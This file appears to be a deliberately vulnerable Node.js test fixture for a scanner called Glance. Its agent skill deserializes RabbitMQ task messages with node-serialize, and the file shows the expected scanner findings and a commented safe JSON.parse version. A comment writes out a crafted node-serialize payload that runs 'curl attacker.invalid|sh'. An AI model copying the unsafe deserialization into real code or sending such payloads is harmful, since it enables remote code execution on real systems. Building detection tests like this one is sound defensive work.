// AGENT SKILL: task-deserializer-tool.js
// VULNERABILITY: Unsafe Deserialization (CRITICAL)
//
// Glance detects: Agent skill deserializes task payloads from an external queue
// using node-serialize (or eval-based deserialization), which allows arbitrary
// code execution when the serialized string contains a crafted IIFE.
//
// Real-world risk: An attacker who can write to the task queue (another agent,
// a compromised upstream service, or an SSRF pivot) sends a malicious payload
// and achieves RCE inside the agent process. This is the agent equivalent of
// Java deserialization attacks.
//
// Expected Glance output:
//   🔴 CRITICAL  Unsafe deserialization — node-serialize / eval on external data — line 36
//   🔴 CRITICAL  Code execution via crafted serialized payload — line 36

const serialize = require('node-serialize');
const amqp = require('amqplib');

/**
 * Agent skill: consume task queue and deserialize task objects.
 * Used by an orchestrator agent to pick up work items from RabbitMQ.
 */
async function startTaskConsumer() {
  const conn = await amqp.connect(process.env.RABBITMQ_URL);
  const channel = await conn.createChannel();
  await channel.assertQueue('agent_tasks');

  channel.consume('agent_tasks', (msg) => {
    if (!msg) return;

    const raw = msg.content.toString();

    // BAD: node-serialize.unserialize() executes functions embedded in the payload.
    // A malicious message like:
    //   {"cmd":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker.invalid|sh')}()"}
    // triggers RCE the moment unserialize() is called.
    const task = serialize.unserialize(raw);

    console.log('Processing task:', task.type);
    processTask(task);
    channel.ack(msg);
  });
}

function processTask(task) {
  // ... legitimate task processing
  console.log('Task type:', task.type, 'Priority:', task.priority);
}

/**
 * SAFE version (for comparison in demos):
 *
 * channel.consume('agent_tasks', (msg) => {
 *   const task = JSON.parse(msg.content.toString());  // JSON only, no code
 *   // Validate schema before use
 *   if (!['summarize', 'translate', 'classify'].includes(task.type)) {
 *     channel.nack(msg);
 *     return;
 *   }
 *   processTask(task);
 *   channel.ack(msg);
 * });
 */

module.exports = { startTaskConsumer };
